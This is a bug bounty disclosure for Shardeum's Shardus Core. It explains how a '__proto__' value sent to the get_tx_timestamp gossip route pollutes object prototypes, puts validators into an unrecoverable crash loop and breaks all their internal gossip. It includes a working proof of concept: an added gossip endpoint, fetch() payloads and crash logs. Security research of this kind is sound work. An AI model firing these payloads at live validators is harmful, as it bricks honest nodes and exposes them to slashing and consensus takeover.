# 33637 - \[BC - Critical] In get\_tx\_timestamp a prototype pollution bri...

## In " get\_tx\_timestamp " a prototype pollution bricks validators

Submitted on Jul 25th 2024 at 13:08:56 UTC by @infosec\_us\_team for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33637

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)

### Description

## About The Scope

#### Where is the bug?

The issue is an insecure assignment in line #1049 of `TransactionConsensus.ts`.

> <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/TransactionConsensus.ts#L1049>

#### What are the scope rules of TransactionConsensus.ts?

**@Mehdi** from Shardeum team publicly said in Immunefi's Discord about `TransactionConsensus.ts`:

> *"that was originally out of scope, but it's more accurate to say large parts of TransactionConsensus are out of scope. Large parts of it hold old code that is not active with the default config, namely: code paths that are behind useNewPOQ flag."*
>
> <https://discord.com/channels/787092485969150012/1256211020482084987/1263282057769914368>

They also confirmed that:

> "*Bugs in code from `TransactionConsensu.ts` that are not guarded by any configurable flag at all (like useNewPOQ and others), and that can be directly exploited by anyone, are in scope.*
>
> <https://discord.com/channels/787092485969150012/1256211020482084987/1264362678550265877>

#### This report is in scope

The insecure assignment can be exploited by sending a request to an entry point that isn't guarded by any configurable flag.

***

## Report Description

#### Location of the insecure assignment

The function `generateTimestampReceipt(...)` inside `TransactionConsensus.ts` contains the assignment below, where the value of `signedTsReceipt.cycleCounter` and `txId` are strings controlled by an attacker, and `signedTsReceipt` is an object:

```
this.txTimestampCache[ signedTsReceipt.cycleCounter ][ txId ] = signedTsReceipt;
```

> Line of code from: <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/TransactionConsensus.ts#L1049>

Sending `'__proto__'` as the value for `signedTsReceipt.cycleCounter` and sending `'somethingHere'` as the value for the variable `txId`, the assignment becomes:

```
this.txTimestampCache['__proto__']['somethingHere'] = signedTsReceipt;
```

> If the reader has experience exploiting server-side prototype pollution, the next section can be skipped, but we recommend reading it as a quick recap.

#### Understanding Prototype Pollution

Before diving deep into the report, is important to understand what the vulnerable assignment in Shardus Core does.

Let's start by mentioning the following line:

```
anObject[ '__proto__' ][ 'something' ] = 1;
```

Produces the same outcome as the following line:

```
anObject.constructor.prototype.something = 1;
```

Executing any of them adds by default a field `something` with value `1` to all new and previously created javascript objects during runtime.

**Runnable Example:**

In Typescript create an empty object out of JSON named **person**:

```
let person = JSON.parse( "{}" );
```

Pollute the prototype by adding a field `whitehat` with the value `true`:

```
person['__proto__']['whitehat'] = true;
```

Now the object `person.whitehat` returns true:

```
console.log(person.whitehat); // true
```

But also does all other objects in the entire codebase, whether new or existing. For example, create a completely new object and log its `whitehat` field:

```
let dog = JSON.parse("{}");
console.log(dog.whitehat); // true
```

Here's the full snippet of code for the example if you want to play around:

```
let person = JSON.parse("{}");
person['__proto__']['whitehat'] = true;
console.log(person.whitehat); // true

let dog = JSON.parse("{}");
console.log(dog.whitehat); // true
```

#### Exploiting the attack vector in Shardus Core

Active nodes can gossip other validators using the internal route `get_tx_timestamp` to ask for or store the timestamp of a tx.

Below is the code that handles this request:

```
this.p2p.registerInternal(
  'get_tx_timestamp',
  async (
    payload: { txId: string; cycleCounter: number; cycleMarker: string },
    respond: (arg0: Shardus.TimestampReceipt) => unknown
  ) => {
    const { txId, cycleCounter, cycleMarker } = payload
    /* eslint-disable security/detect-object-injection */
    if (this.txTimestampCache[cycleCounter] && this.txTimestampCache[cycleCounter][txId]) {
      await respond(this.txTimestampCache[cycleCounter][txId])
    } else {
      const tsReceipt: Shardus.TimestampReceipt = this.generateTimestampReceipt(
        txId,
        cycleMarker,
        cycleCounter
      )
      await respond(tsReceipt)
    }
    /* eslint-enable security/detect-object-injection */
  }
)
```

> Snippet of code from: <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/TransactionConsensus.ts#L242-L262>

First, the server checks if the TX is in the cache. If that's the case, it returns its value, if not, it saves to the cache the values given in the request.

```
 ┌────────────────┐                         
 │get_tx_timestamp│                         
 └────────┬───────┘                         
    ______▽______                           
   ╱             ╲    ┌────────────────────┐
  ╱ Is the TX is  ╲___│Return cached value.│
  ╲ in the cache? ╱yes└────────────────────┘
   ╲_____________╱                          
          │no                               
┌─────────▽─────────┐                       
│Store received     │                       
│value in the cache.│                       
└───────────────────┘                       

```

The function `generateTimestampReceipt(...)` is the one that stores the received value in the cache.

```
generateTimestampReceipt(
  txId: string,
  cycleMarker: string,
  cycleCounter: CycleRecord['counter']
): TimestampReceipt {
  const tsReceipt: TimestampReceipt = {
    txId,
    cycleMarker,
    cycleCounter,
    // shardusGetTime() was replaced with shardusGetTime() so we can have a more reliable timestamp consensus
    timestamp: shardusGetTime(),
  }
  const signedTsReceipt = this.crypto.sign(tsReceipt)
  /* prettier-ignore */ this.mainLogger.debug(`Timestamp receipt generated for txId ${txId}: ${utils.stringifyReduce(signedTsReceipt)}`)

  // caching ts receipt for later nodes
  if (!this.txTimestampCache[signedTsReceipt.cycleCounter]) {
    this.txTimestampCache[signedTsReceipt.cycleCounter] = {}
  }
  // eslint-disable-next-line security/detect-object-injection
  this.txTimestampCache[signedTsReceipt.cycleCounter][txId] = signedTsReceipt
  return signedTsReceipt
}
```

> Snippet of code from: <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/TransactionConsensus.ts#L1029-L1051>

There, we can see the vulnerable assignment once again:

**this.txTimestampCache\[signedTsReceipt.cycleCounter]\[txId] = signedTsReceipt**

### Adding fields to all Objects in the server

If the gossipped message to the `get_tx_timestamp` route contains the following payload:

```
{ txId: "bsdsdsdsd", cycleCounter: "__proto__", cycleMarker: "bsdsdsdsd" }
```

> Where "bsdsdsdsd" is random gibberish.

Then, the vulnerable assignment becomes:

```
this.txTimestampCache[ '__proto__' ][ 'bsdsdsdsd' ] = signedTsReceipt
```

As a consequence, all objects in existence and new objects created in the future will contain a field `. bsdsdsdsd` and the value will be the content of the `signedTsReceipt` object.

### A chain of crashes in Shardus Core

Many core functions in Shardus Core read and process the **keys** and **values** of an object.

When an attacker adds an unexpected **key** and **value** to ALL objects in the server, these functions crash, when they crash the server tries to exit by calling the function `exitUncleanly(..)`, but even `exitUncleanly(..)` crashes.

An infinite loop of **crash -> try to exit -> repeat** begins.

Let's analyze one of the functions that starts the crashing loop: Take a look at these lines of code in the `_takeSnapshot()` function (which is executed repeatedly, with a timer):

```
for (const counter in this.counters) {
  this.counters[counter].snapshot()
```

> Code snippet from: <https://github.com/shardeum/shardus-core/blob/dev/src/statistics/index.ts#L337-L362>

One of the **keys** returned by the object **this.counters** after receiving the malicious payload, is **bsdsdsdsd**, which is the gibberish we used in the attack to pollute ALL objects in the server.

The function will crash when trying to execute: `this.counters[ 'bsdsdsdsd' ].snapshot()` because the value of **bsdsdsdsd** does not contain a function named "snapshot()".

> The following error is printed to `./instances/shardus-instance-PORT_OF_VICTIM/logs/out.log`

```
TypeError: this.counters[counter].snapshot is not a function
    at Statistics._takeSnapshot (/home/z/Documents/Temporal/playground/shardeum/codebase/src/statistics/index.ts:346:30)
    at listOnTimeout (node:internal/timers:569:17)
    at processTimers (node:internal/timers:512:7)
```

> The following error is printed to the same path, but file `fatal.log`

```
[2024-07-23T21:01:07.106] [FATAL] fatal - unhandledRejection: TypeError: this.counters[counter].snapshot is not a function
    at Statistics._takeSnapshot (/home/z/Documents/Temporal/playground/shardeum/codebase/src/statistics/index.ts:346:30)
    at listOnTimeout (node:internal/timers:569:17)
    at processTimers (node:internal/timers:512:7)
```

When that line crashes, the exception handler registered here <https://github.com/shardeum/shardus-core/blob/dev/src/shardus/index.ts#L2856-L2887> will try to shut down the server *uncleanly*.

### Forcing nodes to keep running under invalid states

But the exit attempt throws an exception as well, with the following stack trace:

```
[2024-07-23T21:01:07.120] [FATAL] fatal - unhandledRejection: TypeError: this.powGenerators[generator].kill is not a function
    at Crypto.stopAllGenerators (/home/z/Documents/Temporal/playground/shardeum/codebase/src/crypto/index.ts:233:37)
    at /home/z/Documents/Temporal/playground/shardeum/codebase/src/shardus/index.ts:267:19
    at ExitHandler._cleanupSync (/home/z/Documents/Temporal/playground/shardeum/codebase/src/exit-handler/index.ts:87:7)
    at ExitHandler.exitUncleanly (/home/z/Documents/Temporal/playground/shardeum/codebase/src/exit-handler/index.ts:109:10)
    at logFatalAndExit (/home/z/Documents/Temporal/playground/shardeum/codebase/src/shardus/index.ts:3009:24)
    at process.<anonymous> (/home/z/Documents/Temporal/playground/shardeum/codebase/src/shardus/index.ts:3012:7)
    at process.emit (node:events:525:35)
    at process.emit (/home/z/.nvm/versions/node/v18.16.1/lib/node_modules/shardus/node_modules/source-map-support/source-map-support.js:495:21)
    at process._fatalException (node:internal/process/execution:149:25)
```

It throws an exception because it tries to execute `this.powGenerators[generator].kill` where `generator` is a **key** read from an object. All objects now include an additional key named "**bsdsdsdsd**", and the value of that key does not contain a function named `kill`, therefore it throws an exception when calling `this.powGenerators['bsdsdsdsd'].kill()`

***

## Quick recap before moving to the next part of the exploit

What we can achieve so far:

**1-** A victim node can be moved to a state where some functions are constantly crashing and others will crash on demand.

**2-** The node is unable to restart/quit because `exitUncleanly(..)` crashes as well. As a consequence, he is forced to keep running no matter what invalid state he is in.

***

### Forcing the victim node to crash all internal gossip

When a node is selected to become active, he can send and receive messages to other active nodes using an "`internal gossip route`".

The application is notified of nodes that are lost or unresponsive and can choose to slash them.

> This section of the report focuses on making a victim node slashable: The node will sync data as usual, but will never respond to internal gossip.

When receiving a gossiped message, the code attempts to extract the payload in the following lines:

```
function _extractPayload(wrappedPayload, nodeGroup) {
  let err = utils.validateTypes(wrappedPayload, { error: 's?' })
```

> Snippet of code from: <https://github.com/shardeum/shardus-core/blob/dev/src/p2p/Comms.ts#L183-L184>

The field `error` in the payload is optional, and a check is made to ensure that if it exists, it has to be of type **string**. If not, it throws an exception.

```
 ┌───────────────┐                                      
 │Gossip received│                                      
 └───────┬───────┘                                      
 ┌───────▽───────┐                                      
 │Extract Payload│                                      
 └───────┬───────┘                                      
  _______▽_______       __________________              
 ╱               ╲     ╱                  ╲    ┌───────┐
╱ Contains ERROR? ╲___╱ Is ERROR a string? ╲___│SUCCEED│
╲                 ╱yes╲                    ╱yes└───────┘
 ╲_______________╱     ╲__________________╱             
         │no                    │no                     
     ┌───▽───┐               ┌──▽─┐                     
     │SUCCEED│               │FAIL│                     
     └───────┘               └────┘                     
```

To proceed with the exploit, we gossip a message to the internal route that is vulnerable to prototype pollution ("`get_tx_timestamp`") with the following payload:

```
{ txId: "error", cycleCounter: "__proto__", cycleMarker: "error" }
```

Then, the vulnerable assignment becomes:

```
this.txTimestampCache[ '__proto__' ][ 'error' ] = signedTsReceipt
```

> Which pollutes all existing objects with a field `error` that contains a value of type object (**signedTsReceipt** is an object).

Now, when the victim node receives any internal gossip message, the code will try to unwrap the payload and realize a field `error` exists. When checking if it is a string, it will fail and throw the following error:

```
[2024-07-24T13:32:52.515] [WARN] p2p - Comms: extractPayload: bad wrappedPayload: error must be, string
```

## Impact of this report

A malicious node can either target a single node or a group of nodes with a prototype pollution attack that:

**1-** Moves nodes into an invalid state that constantly crashes.

**2-** Forces these nodes to continue working under any invalid state, by crashing all automatic attempts to exit.

**3-** Makes the victim nodes susceptible to slashing, by allowing them to operate basic actions as usual but to throw an exception in all internal gossip routes.

* A slashing event creates a loss of funds for a node.
* Continuously exploiting legit active nodes with this attack vector, every time a malicious node is selected as an active validator, leads to a bricked network.
* In the worst-case scenario all nodes except those controlled by the attacker, will have been polluted, put into an invalid state, and kicked out of the network. Then only malicious nodes can be selected, allowing them to control the outcome of any consensus.

### Proof of concept

Before modifying the code directly to include the proof of concept, is important to start a fresh setup to prevent issues raised by working with a custom version of the codebase.

### Prepare a fresh setup

* Clone the Shardus Core and Shardeum repo locally.
* Apply the `debug-10-nodes.patch` patch.
* Point Shardeum to the local version of Shardus Core by modifying the file `package.json` as instructed in the repos.
* In your local copy of Shardeum, open the file `./src/index.ts` and add the following function at line #1125 (<https://github.com/shardeum/shardeum/blob/dev/src/index.ts#L1125>)

```
  shardus.registerExternalPost('infosec_gossipAnything/', externalApiMiddleware, async (req, res) => {
    try {
      const obj = JSON.parse(JSON.stringify(req.body));

      const route = req.query.route as string;

      const pk = req.query.pk as string;
      let node = shardus.getNodeByPubKey(pk);

      console.log(`INFOSEC: sending to node: ${JSON.stringify({ node })}`);
      await shardus.p2p.tell([node], route, obj, true, '')

      return res.json({ "ok": 1 });
    } catch (e) {
      return res.json({ "error": e });
    }
  });
```

> The code snippet above allows a malicious node to receive an HTTP **POST** request with a public key, a route, and a payload, then gossip it to the corresponding victim.
>
> We will use this entry point to gossip a message from a malicious validator to a victim

* Install dependencies and build both repositories.
* Start the network with `shardus start 10`
* Go to the monitor page at <http://SERVER\\_IP:3000/> and wait until the `Cycle Counter` number **15**. By that time all 10 nodes should be active.

### Distributing the malicious payload

By now, all 10 nodes should be active.

* Select any node you want to be the victim

For this example, we'll pick the one running at port 9003.

Visit <http://SERVER\\_IP:4000/nodelist> - you will see a list of active nodes and their public keys. Copy the public key of the node running at port 9003.

* Select any node you want to act maliciously.

For this example, we'll pick the one running at port 9002.

In a new tab visit <http://SERVER\\_IP:9002> (replace *9002* with the port of the node you decide to pick as malicious).

* Prepare the payload.

While still in the tab for the URL <http://SERVER\\_IP:9002> - open the developer console in your browser *(right-click in the blank space of the page, select "Inspect element", then click in the "Console" tab)*.

Paste the following snippet of code in the console. **REPLACE "SERVER\_IP" with the IP of the server and REPLACE "PK\_OF\_VICTIM" with the public key of the victim you selected.**

```
fetch(`http://SERVER_IP:9002/infosec_gossipAnything/?route=get_tx_timestamp&pk=PK_OF_VICTIM`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        txId: "error",
        cycleCounter: "__proto__",
        cycleMarker: "error"
    })
}).then(response => {
    if (!response.ok) {
        throw new Error('Network response was not ok');
    }
    return response.json();
}).then(data => {
    console.log('Success:', data);
}).catch(error => {
    console.error('Error:', error);
})
```

Press Enter on your keyboard to execute the code.

### State of the victim node after sending the payload

If the steps were followed correctly:

* The browser console will output:

```
Success - { ok: 1 }
```

* The Network Monitor running at port 3000 will paint in red the victim node and later remove it from the screen:

> A screenshot here: <https://ibb.co/zJN4qGK>

* The output of running `shardus pm2 list` shows that all nodes are *online*:

```
┌─────┬────────────────────────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name                       │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────────────────────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 1   │ "archive-server-1"         │ default     │ 3.4.21  │ fork    │ 421052   │ 25m    │ 0    │ online    │ 0%       │ 88.7mb   │ z        │ disabled │
│ 2   │ "monitor-server"           │ default     │ 2.6.3   │ fork    │ 421074   │ 25m    │ 0    │ online    │ 0%       │ 146.3mb  │ z        │ disabled │
│ 3   │ "shardus-instance-9001"    │ default     │ 1.11.4  │ fork    │ 421100   │ 25m    │ 0    │ online    │ 0%       │ 166.2mb  │ z        │ disabled │
│ 4   │ "shardus-instance-9002"    │ default     │ 1.11.4  │ fork    │ 421125   │ 25m    │ 0    │ online    │ 0%       │ 162.5mb  │ z        │ disabled │
│ 5   │ "shardus-instance-9003"    │ default     │ 1.11.4  │ fork    │ 421148   │ 25m    │ 0    │ online    │ 0%       │ 161.1mb  │ z        │ disabled │
│ 6   │ "shardus-instance-9004"    │ default     │ 1.11.4  │ fork    │ 421174   │ 25m    │ 0    │ online    │ 0%       │ 163.6mb  │ z        │ disabled │
│ 7   │ "shardus-instance-9005"    │ default     │ 1.11.4  │ fork    │ 421200   │ 25m    │ 0    │ online    │ 0%       │ 160.2mb  │ z        │ disabled │
│ 8   │ "shardus-instance-9006"    │ default     │ 1.11.4  │ fork    │ 421226   │ 25m    │ 0    │ online    │ 0%       │ 160.3mb  │ z        │ disabled │
│ 9   │ "shardus-instance-9007"    │ default     │ 1.11.4  │ fork    │ 421252   │ 25m    │ 0    │ online    │ 0%       │ 162.9mb  │ z        │ disabled │
│ 10  │ "shardus-instance-9008"    │ default     │ 1.11.4  │ fork    │ 421278   │ 25m    │ 0    │ online    │ 0%       │ 161.2mb  │ z        │ disabled │
│ 11  │ "shardus-instance-9009"    │ default     │ 1.11.4  │ fork    │ 421319   │ 25m    │ 0    │ online    │ 0%       │ 163.3mb  │ z        │ disabled │
│ 12  │ "shardus-instance-9010"    │ default     │ 1.11.4  │ fork    │ 421352   │ 25m    │ 0    │ online    │ 0%       │ 167.7mb  │ z        │ disabled │
└─────┴────────────────────────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘
Module
┌────┬──────────────────────────────┬───────────────┬──────────┬──────────┬──────┬──────────┬──────────┬──────────┐
│ id │ module                       │ version       │ pid      │ status   │ ↺    │ cpu      │ mem      │ user     │
├────┼──────────────────────────────┼───────────────┼──────────┼──────────┼──────┼──────────┼──────────┼──────────┤
│ 0  │ pm2-logrotate                │ 2.7.0         │ 421015   │ online   │ 2    │ 0%       │ 67.1mb   │ z        │
└────┴──────────────────────────────┴───────────────┴──────────┴──────────┴──────┴──────────┴──────────┴──────────┘
```

* The victim node starts to throw exceptions:

Below is the first one - *we explain in the report exactly why it throws*:

```
[2024-07-24T17:56:23.475] [FATAL] fatal - unhandledRejection: TypeError: this.counters[counter].snapshot is not a function
    at Statistics._takeSnapshot (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/dist/statistics/index.js:301:36)
    at listOnTimeout (node:internal/timers:569:17)
    at processTimers (node:internal/timers:512:7)
```

> Verify this in the log file located at `./instances/shardus-instance-9003/logs/fatal.log`

Right after firing this exception, the victim node will attempt to exit uncleanly, but that process throws another exception:

```
[2024-07-24T17:56:23.478] [FATAL] fatal - unhandledRejection: TypeError: this.powGenerators[generator].kill is not a function
    at Crypto.stopAllGenerators (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/dist/crypto/index.js:215:43)
    at /home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/shardus/index.ts:267:19
    at ExitHandler._cleanupSync (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/dist/exit-handler/index.js:83:13)
    at ExitHandler.exitUncleanly (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/shardus-core/dist/exit-handler/index.js:107:14)
    at logFatalAndExit (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/shardus/index.ts:2879:24)
    at process.<anonymous> (/home/z/Documents/Temporal/playground/shardeum/pocs/server4/src/shardus/index.ts:2882:7)
    at process.emit (node:events:525:35)
    at process.emit (/home/z/.nvm/versions/node/v18.16.1/lib/node_modules/shardus/node_modules/source-map-support/source-map-support.js:495:21)
    at process._fatalException (node:internal/process/execution:149:25)
```

> Verify this in the log file located at `./instances/shardus-instance-9003/logs/fatal.log`

Then it keeps encountering exceptions at runtime and logging them in the same file.

More details about the payload the victim received and the chain of crashes can be read at `./instances/shardus-instance-9003/logs/main.log`:

```
[2024-07-24T17:56:22.801] [DEBUG] main - Timestamp receipt generated for txId error: {"cycleCounter":"__proto__","cycleMarker":"error","sign":{"owner":"be55xb5bf7","sig":"6dfbxxdad07"},"timestamp":1721861782798,"txId":"error"}
[2024-07-24T17:56:23.475] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-24T17:56:23.475] [INFO] main - Stopping reporter...
[2024-07-24T17:56:23.476] [INFO] main - Stopping statistics reporting...
[2024-07-24T17:56:23.476] [INFO] main - Stopping POW generators...
[2024-07-24T17:56:23.478] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-24T17:56:24.472] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-24T17:56:25.473] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-24T17:56:26.472] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-24T17:56:27.473] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-24T17:56:28.474] [INFO] main - exitUncleanly: logFatalAndExit
[2024-07-24T17:56:29.475] [INFO] main - exitUncleanly: logFatalAndExit
...
```

### Prove of victim node rejecting all internal gossips

Go back to the developer's console and run the following:

```
fetch(`http://SERVER_IP:9002/infosec_gossipAnything/?route=get_tx_timestamp&pk= PK_OF_VICTIM `, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        txId: "test",
        cycleCounter: "test",
        cycleMarker: "test"
    })
}).then(response => {
    if (!response.ok) {
        throw new Error('Network response was not ok');
    }
    return response.json();
}).then(data => {
    console.log('Success:', data);
}).catch(error => {
    console.error('Error:', error);
})
```

This time, we are sending a normal payload, without exploiting the prototype pollution in any way. The payload we are sending is `{ txId: "test", cycleCounter: "test", cycleMarker: "test" }`

After sending, quickly go to `./instances/shardus-instance-9003/logs/p2p.log` and you will see the following error being logged:

```
[2024-07-24T18:12:00.001] [WARN] p2p - Comms: extractPayload: bad wrappedPayload: error must be, string {"msgSize":220,"payload":{"cycleCounter":"test","cycleMarker":"test","txId":"test"},"sender":"1ab2ecacbe37f269c41169249403a9009a4c76b24bd100222ab65afe37e8350e","sign":{"owner":"6de2a93d12ff8f8bbcb0d3d9f69a3ff4c85d495c752642d2ab68e913559f7c09","sig":"12b3ccf7a3b37a34f1148b47403ac7da38137b605ce40ddbafcdeb4509fa4ec51b0f3526ab3303226dcf5f77ad46ef6c4f66893b475a98da83e40760277b650d077e8619100f48edfbbf16bb45c9a10b95d4a86e124d055bf255c74197b96fd0"},"tracker":"key_get_tx_timestamp_1ab2x8350e_1721862719991_365"}
```

The relevant segment is **Comms: extractPayload: bad wrappedPayload: error must be, string**.

We have polluted the value `error` of all objects in the victim node, and now everywhere in Shardus Core and Shardeum that is enforced this value to be a string in case it exists, will throw an exception.
